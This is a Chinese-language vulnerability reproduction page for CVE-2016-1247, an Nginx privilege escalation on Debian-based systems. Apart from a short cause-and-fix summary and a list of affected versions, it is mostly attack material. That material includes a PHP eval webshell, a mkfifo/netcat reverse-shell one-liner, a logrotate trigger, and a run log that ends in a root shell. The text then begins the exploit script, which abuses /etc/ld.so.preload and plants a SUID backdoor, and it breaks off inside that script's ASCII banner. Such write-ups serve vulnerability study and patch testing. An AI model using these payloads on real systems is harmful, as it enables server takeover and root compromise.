<!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Transitional//EN" "http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd">
<html xmlns="http://www.w3.org/1999/xhtml">
	<head>
		<meta http-equiv="Content-Type" content="text/html; charset=utf-8" /><title>
		</title>
		<style type="text/css">
			.csAD577193{text-align:left;text-indent:0pt;margin:24pt 0pt 0pt 0pt;page-break-after:avoid;page-break-inside:avoid}
			.csECDA2D3{color:#4F81BD;background-color:transparent;font-family:Microsoft YaHei UI;font-size:16pt;font-weight:bold;font-style:normal;}
			.csDE05BCC{color:#4F81BD;background-color:transparent;font-family:Calibri;font-size:16pt;font-weight:bold;font-style:normal;}
			.cs868C439D{text-align:left;text-indent:0pt;margin:10pt 0pt 0pt 0pt;page-break-after:avoid;page-break-inside:avoid}
			.cs83F14626{color:#4F81BD;background-color:transparent;font-family:Microsoft YaHei UI;font-size:14pt;font-weight:bold;font-style:normal;}
			.cs40DD2BC9{text-align:left;text-indent:0pt;margin:9pt 0pt 9pt 0pt}
			.cs9C1B1871{color:#000000;background-color:transparent;font-family:Microsoft YaHei UI;font-size:12pt;font-weight:normal;font-style:normal;}
			.cs8926E06{color:#000000;background-color:transparent;font-family:Calibri;font-size:12pt;font-weight:normal;font-style:normal;}
			.cs3A447A38{text-align:left;text-indent:0pt;margin:0pt 0pt 10pt 0pt}
			.cs9FB05234{color:#000000;background-color:transparent;font-family:Consolas;font-size:11pt;font-weight:normal;font-style:normal;}
			.cs508254C{color:#000000;background-color:transparent;font-family:Calibri;font-size:12pt;font-weight:normal;font-style:normal;text-decoration: none;}
			.cs4B51D5E4{color:#4F81BD;background-color:transparent;font-family:Calibri;font-size:12pt;font-weight:normal;font-style:normal;}
			.csD1E291E2{color:#4F81BD;background-color:transparent;font-family:Calibri;font-size:12pt;font-weight:bold;font-style:normal;}
		</style>
	</head>
	<body>
		<h1 class="csAD577193">
			<a name="cve-2016-1247nginx-提权漏洞"><span class="csECDA2D3">（</span><span class="csDE05BCC">CVE-2016-1247</span><span class="csECDA2D3">）</span><span class="csDE05BCC">Nginx </span><span class="csECDA2D3">提权漏洞</span></a></h1>
		<h2 class="cs868C439D">
			<a name="一漏洞简介"><span class="cs83F14626">一、漏洞简介</span></a></h2>
		<p class="cs40DD2BC9"><span class="cs9C1B1871">漏洞原因是在打包</span><span class="cs8926E06">nginx</span><span class="cs9C1B1871">时，设置的日志目录的所有者为</span><span class="cs8926E06"> www-data </span><span class="cs9C1B1871">，导致一个低权限账户可以利用软链接的帮助达到提权。所以修复也是将日志的所有者改为</span><span class="cs8926E06">root</span><span class="cs9C1B1871">即可。</span></p><h2 class="cs868C439D">
			<a name="二漏洞影响"><span class="cs83F14626">二、漏洞影响</span></a></h2>
		<p class="cs40DD2BC9"><span class="cs8926E06">Debian: Fixed in Nginx 1.6.2-5+deb8u3</span></p><p class="cs40DD2BC9"><span class="cs8926E06">Ubuntu:</span></p><p class="cs40DD2BC9"><span class="cs8926E06">Fixed in the following updated Nginx package versions on Ubuntu:</span></p><p class="cs40DD2BC9"><span class="cs8926E06">Ubuntu 16.04 LTS: 1.10.0-0ubuntu0.16.04.3</span></p><p class="cs40DD2BC9"><span class="cs8926E06">Ubuntu 14.04 LTS: 1.4.6-1ubuntu3.6</span></p><p class="cs40DD2BC9"><span class="cs8926E06">Ubuntu 16.10: 1.10.1-0ubuntu1.1</span></p><h2 class="cs868C439D">
			<a name="三复现过程"><span class="cs83F14626">三、复现过程</span></a></h2>
		<p class="cs3A447A38"><span class="cs9FB05234">docker run -d -i --name CVE-2016-1247 -p 80:80 xk0n/cve-2016-1247</span></p><p class="cs40DD2BC9"><span class="cs9C1B1871">在容器里配置了</span><span class="cs8926E06"> nginx + php </span><span class="cs9C1B1871">的环境，并有一个一句话木马</span><span class="cs8926E06"> </span><span class="cs9FB05234">/var/www/backdoor.php</span></p><p class="cs3A447A38"><span class="cs9FB05234">&lt;?php</span><span class="cs8926E06"><br/></span><span class="cs9FB05234">@eval($_POST[c]);</span><span class="cs8926E06"><br/></span><span class="cs9FB05234">?&gt;</span></p><p class="cs40DD2BC9"><span class="cs9C1B1871">可以用</span><span class="cs8926E06"><a class="cs508254C" href="https://github.com/antoor/antSword"><span class="cs4B51D5E4">antSword</span></a></span><span class="cs9C1B1871">连接测试，用下面的语句可以反弹回一个</span><span class="cs8926E06">shell</span></p><p class="cs3A447A38"><span class="cs9FB05234">mkfifo /tmp/bd;cat /tmp/bd | /bin/sh -i 2&gt;&amp;1 | nc &lt;target IP&gt; &lt;port&gt; &gt;/tmp/bd</span></p><p class="cs40DD2BC9"><span class="cs9C1B1871">测试时发现</span><span class="cs8926E06">gcc</span><span class="cs9C1B1871">编译出错，可以在本地编译一个后上传。</span><span class="cs8926E06">poc</span><span class="cs9C1B1871">运行后会等待</span><span class="cs8926E06"> logrotate </span><span class="cs9C1B1871">此时可以用下面的命令，人工触发条件。</span></p><p class="cs3A447A38"><span class="cs9FB05234">/usr/sbin/logrotate -vf /etc/logrotate.d/nginx</span></p><p class="cs40DD2BC9"><span class="cs9C1B1871">测试记录如下：</span></p><p class="cs3A447A38"><span class="cs9FB05234">$ bash ./cve-2016-1247-poc.sh /var/log/nginx/error.log</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> _______________________________</span><span class="cs8926E06"><br/></span><span class="cs9FB05234">&lt; Is your server (N)jinxed ? ;o &gt;</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> -------------------------------</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;\ </span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;\ &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;__---__</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;_- &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;/--______</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;__--( / &nbsp;&nbsp;&nbsp;&nbsp;\ )XXXXXXXXXXX\v. &nbsp;</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;.-XXX( &nbsp;&nbsp;O &nbsp;&nbsp;O &nbsp;)XXXXXXXXXXXXXXX- </span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;/XXX( &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;U &nbsp;&nbsp;&nbsp;&nbsp;) &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;XXXXXXX\ </span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;/XXXXX( &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;)--_ &nbsp;XXXXXXXXXXX\ </span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;/XXXXX/ ( &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;O &nbsp;&nbsp;&nbsp;&nbsp;) &nbsp;&nbsp;XXXXXX &nbsp;&nbsp;\XXXXX\ </span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;XXXXX/ &nbsp;&nbsp;/ &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;XXXXXX &nbsp;&nbsp;\__ \XXXXX</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;XXXXXX__/ &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;XXXXXX &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;\__----&gt;</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> ---___ &nbsp;XXX__/ &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;XXXXXX &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;\__ &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;/</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;\- &nbsp;--__/ &nbsp;&nbsp;___/\ &nbsp;XXXXXX &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;/ &nbsp;___--/=</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;\-\ &nbsp;&nbsp;&nbsp;___/ &nbsp;&nbsp;&nbsp;XXXXXX &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&#39;--- XXXXXX</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;\-\/XXX\ XXXXXX &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;/XXXXX</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;\XXXXXXXXX &nbsp;&nbsp;\ &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;/XXXXX/</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;\XXXXXX &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&gt; &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;_/XXXXX/</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;\XXXXX--__/ &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;__-- XXXX/</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;-XXXXXXXX--------------- &nbsp;XXXXXX-</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;\XXXXXXXXXXXXXXXXXXXXXXXXXX/</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&quot;&quot;VXXXXXXXXXXXXXXXXXXV&quot;&quot;</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> </span><span class="cs8926E06"><br/></span><span class="cs9FB05234">Nginx (Debian-based distros) - Root Privilege Escalation PoC Exploit (CVE-2016-1247) </span><span class="cs8926E06"><br/></span><span class="cs9FB05234">nginxed-root.sh (ver. 1.0)</span><span class="cs8926E06"><br/><br/></span><span class="cs9FB05234">Discovered and coded by: </span><span class="cs8926E06"><br/><br/></span><span class="cs9FB05234">Dawid Golunski </span><span class="cs8926E06"><br/></span><span class="cs9FB05234">https://legalhackers.com </span><span class="cs8926E06"><br/><br/></span><span class="cs9FB05234">[+] Starting the exploit as: </span><span class="cs8926E06"><br/></span><span class="cs9FB05234">uid=33(www-data) gid=33(www-data) groups=33(www-data)</span><span class="cs8926E06"><br/><br/></span><span class="cs9FB05234">[+] Backdoor/low-priv shell installed at: </span><span class="cs8926E06"><br/></span><span class="cs9FB05234">-rwxr-xr-x 1 www-data www-data 1021112 Nov 19 13:44 /tmp/nginxrootsh</span><span class="cs8926E06"><br/><br/></span><span class="cs9FB05234">[+] The server appears to be (N)jinxed (writable logdir) ! :) Symlink created at: </span><span class="cs8926E06"><br/></span><span class="cs9FB05234">lrwxrwxrwx 1 www-data www-data 18 Nov 19 13:44 /var/log/nginx/error.log -&gt; /etc/ld.so.preload</span><span class="cs8926E06"><br/><br/></span><span class="cs9FB05234">[+] Waiting for Nginx service to be restarted (-USR1) by logrotate called from cron.daily at 6:25am...</span><span class="cs8926E06"><br/></span><span class="cs9FB05234">[+] Nginx restarted. The /etc/ld.so.preload file got created with web server privileges: </span><span class="cs8926E06"><br/></span><span class="cs9FB05234">-rw-r--r-- 1 www-data root 19 Nov 19 13:45 /etc/ld.so.preload</span><span class="cs8926E06"><br/><br/></span><span class="cs9FB05234">[+] Adding /tmp/privesclib.so shared lib to /etc/ld.so.preload</span><span class="cs8926E06"><br/><br/></span><span class="cs9FB05234">[+] The /etc/ld.so.preload file now contains: </span><span class="cs8926E06"><br/></span><span class="cs9FB05234">/tmp/privesclib.so</span><span class="cs8926E06"><br/><br/></span><span class="cs9FB05234">[+] Escalating privileges via the /usr/bin/sudo SUID binary to get root!</span><span class="cs8926E06"><br/></span><span class="cs9FB05234">-rwsrwxrwx 1 root root 1021112 Nov 19 13:44 /tmp/nginxrootsh</span><span class="cs8926E06"><br/><br/></span><span class="cs9FB05234">[+] Rootshell got assigned root SUID perms at: </span><span class="cs8926E06"><br/></span><span class="cs9FB05234">-rwsrwxrwx 1 root root 1021112 Nov 19 13:44 /tmp/nginxrootsh</span><span class="cs8926E06"><br/><br/></span><span class="cs9FB05234">The server is (N)jinxed ! ;) Got root via Nginx!</span><span class="cs8926E06"><br/><br/></span><span class="cs9FB05234">[+] Spawning the rootshell /tmp/nginxrootsh now! </span><span class="cs8926E06"><br/><br/></span><span class="cs9FB05234">nginxrootsh: cannot set terminal process group (1156): Inappropriate ioctl for device</span><span class="cs8926E06"><br/></span><span class="cs9FB05234">nginxrootsh: no job control in this shell</span><span class="cs8926E06"><br/></span><span class="cs9FB05234">nginxrootsh-4.3# id</span><span class="cs8926E06"><br/></span><span class="cs9FB05234">id</span><span class="cs8926E06"><br/></span><span class="cs9FB05234">uid=33(www-data) gid=33(www-data) euid=0(root) groups=0(root),33(www-data)</span><span class="cs8926E06"><br/></span><span class="cs9FB05234">nginxrootsh-4.3# whoami</span><span class="cs8926E06"><br/></span><span class="cs9FB05234">whoami</span><span class="cs8926E06"><br/></span><span class="cs9FB05234">root</span><span class="cs8926E06"><br/></span><span class="cs9FB05234">nginxrootsh-4.3# whoami</span><span class="cs8926E06"><br/></span><span class="cs9FB05234">whoami</span><span class="cs8926E06"><br/></span><span class="cs9FB05234">root</span></p><h3 class="cs868C439D">
			<a name="poc"><span class="csD1E291E2">poc</span></a></h3>
		<p class="cs3A447A38"><span class="cs9FB05234">#!/bin/bash</span><span class="cs8926E06"><br/></span><span class="cs9FB05234">#</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"># Nginx (Debian-based distros) - Root Privilege Escalation PoC Exploit</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"># nginxed-root.sh (ver. 1.0)</span><span class="cs8926E06"><br/></span><span class="cs9FB05234">#</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"># CVE-2016-1247</span><span class="cs8926E06"><br/></span><span class="cs9FB05234">#</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"># Discovered and coded by:</span><span class="cs8926E06"><br/></span><span class="cs9FB05234">#</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"># Dawid Golunski</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"># dawid[at]legalhackers.com</span><span class="cs8926E06"><br/></span><span class="cs9FB05234">#</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"># https://legalhackers.com</span><span class="cs8926E06"><br/></span><span class="cs9FB05234">#</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"># Follow https://twitter.com/dawid_golunski for updates on this advisory.</span><span class="cs8926E06"><br/></span><span class="cs9FB05234">#</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"># ---</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"># This PoC exploit allows local attackers on Debian-based systems (Debian, Ubuntu</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"># etc.) to escalate their privileges from nginx web server user (www-data) to root </span><span class="cs8926E06"><br/></span><span class="cs9FB05234"># through unsafe error log handling.</span><span class="cs8926E06"><br/></span><span class="cs9FB05234">#</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"># The exploit waits for Nginx server to be restarted or receive a USR1 signal.</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"># On Debian-based systems the USR1 signal is sent by logrotate (/etc/logrotate.d/nginx)</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"># script which is called daily by the cron.daily on default installations.</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"># The restart should take place at 6:25am which is when cron.daily executes.</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"># Attackers can therefore get a root shell automatically in 24h at most without any admin</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"># interaction just by letting the exploit run till 6:25am assuming that daily logrotation </span><span class="cs8926E06"><br/></span><span class="cs9FB05234"># has been configured. </span><span class="cs8926E06"><br/></span><span class="cs9FB05234">#</span><span class="cs8926E06"><br/></span><span class="cs9FB05234">#</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"># Exploit usage:</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"># ./nginxed-root.sh path_to_nginx_error.log </span><span class="cs8926E06"><br/></span><span class="cs9FB05234">#</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"># To trigger logrotation for testing the exploit, you can run the following command:</span><span class="cs8926E06"><br/></span><span class="cs9FB05234">#</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"># /usr/sbin/logrotate -vf /etc/logrotate.d/nginx</span><span class="cs8926E06"><br/></span><span class="cs9FB05234">#</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"># See the full advisory for details at:</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"># https://legalhackers.com/advisories/Nginx-Exploit-Deb-Root-PrivEsc-CVE-2016-1247.html</span><span class="cs8926E06"><br/></span><span class="cs9FB05234">#</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"># Video PoC:</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"># https://legalhackers.com/videos/Nginx-Exploit-Deb-Root-PrivEsc-CVE-2016-1247.html</span><span class="cs8926E06"><br/></span><span class="cs9FB05234">#</span><span class="cs8926E06"><br/></span><span class="cs9FB05234">#</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"># Disclaimer:</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"># For testing purposes only. Do no harm.</span><span class="cs8926E06"><br/></span><span class="cs9FB05234">#</span><span class="cs8926E06"><br/><br/></span><span class="cs9FB05234">BACKDOORSH=&quot;/bin/bash&quot;</span><span class="cs8926E06"><br/></span><span class="cs9FB05234">BACKDOORPATH=&quot;/tmp/nginxrootsh&quot;</span><span class="cs8926E06"><br/></span><span class="cs9FB05234">PRIVESCLIB=&quot;/tmp/privesclib.so&quot;</span><span class="cs8926E06"><br/></span><span class="cs9FB05234">PRIVESCSRC=&quot;/tmp/privesclib.c&quot;</span><span class="cs8926E06"><br/></span><span class="cs9FB05234">SUIDBIN=&quot;/usr/bin/sudo&quot;</span><span class="cs8926E06"><br/><br/></span><span class="cs9FB05234">function cleanexit {</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;# Cleanup </span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;echo -e &quot;\n[+] Cleaning up...&quot;</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;rm -f $PRIVESCSRC</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;rm -f $PRIVESCLIB</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;rm -f $ERRORLOG</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;touch $ERRORLOG</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;if [ -f /etc/ld.so.preload ]; then</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;echo -n &gt; /etc/ld.so.preload</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;fi</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;echo -e &quot;\n[+] Job done. Exiting with code $1 \n&quot;</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;exit $1</span><span class="cs8926E06"><br/></span><span class="cs9FB05234">}</span><span class="cs8926E06"><br/><br/></span><span class="cs9FB05234">function ctrl_c() {</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;echo -e &quot;\n[+] Ctrl+C pressed&quot;</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;cleanexit 0</span><span class="cs8926E06"><br/></span><span class="cs9FB05234">}</span><span class="cs8926E06"><br/><br/></span><span class="cs9FB05234">#intro </span><span class="cs8926E06"><br/><br/></span><span class="cs9FB05234">cat &lt;&lt;_eascii_</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> _______________________________</span><span class="cs8926E06"><br/></span><span class="cs9FB05234">&lt; Is your server (N)jinxed ? ;o &gt;</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> -------------------------------</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;\ </span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;\ &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;__---__</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;_- &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;/--______</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;__--( / &nbsp;&nbsp;&nbsp;&nbsp;\ )XXXXXXXXXXX\v. &nbsp;</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;.-XXX( &nbsp;&nbsp;O &nbsp;&nbsp;O &nbsp;)XXXXXXXXXXXXXXX- </span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;/XXX( &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;U &nbsp;&nbsp;&nbsp;&nbsp;) &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;XXXXXXX\ </span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;/XXXXX( &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;)--_ &nbsp;XXXXXXXXXXX\ </span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;/XXXXX/ ( &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;O &nbsp;&nbsp;&nbsp;&nbsp;) &nbsp;&nbsp;XXXXXX &nbsp;&nbsp;\XXXXX\ </span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;XXXXX/ &nbsp;&nbsp;/ &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;XXXXXX &nbsp;&nbsp;\__ \XXXXX</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;XXXXXX__/ &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;XXXXXX &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;\__----&gt;</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> ---___ &nbsp;XXX__/ &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;XXXXXX &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;\__ &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;/</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;\- &nbsp;--__/ &nbsp;&nbsp;___/\ &nbsp;XXXXXX &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;/ &nbsp;___--/=</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;\-\ &nbsp;&nbsp;&nbsp;___/ &nbsp;&nbsp;&nbsp;XXXXXX &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&#39;--- XXXXXX</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;\-\/XXX\ XXXXXX &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;/XXXXX</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;\XXXXXXXXX &nbsp;&nbsp;\ &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;/XXXXX/</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;\XXXXXX &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&gt; &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;_/XXXXX/</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;\XXXXX--__/ &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;__-- 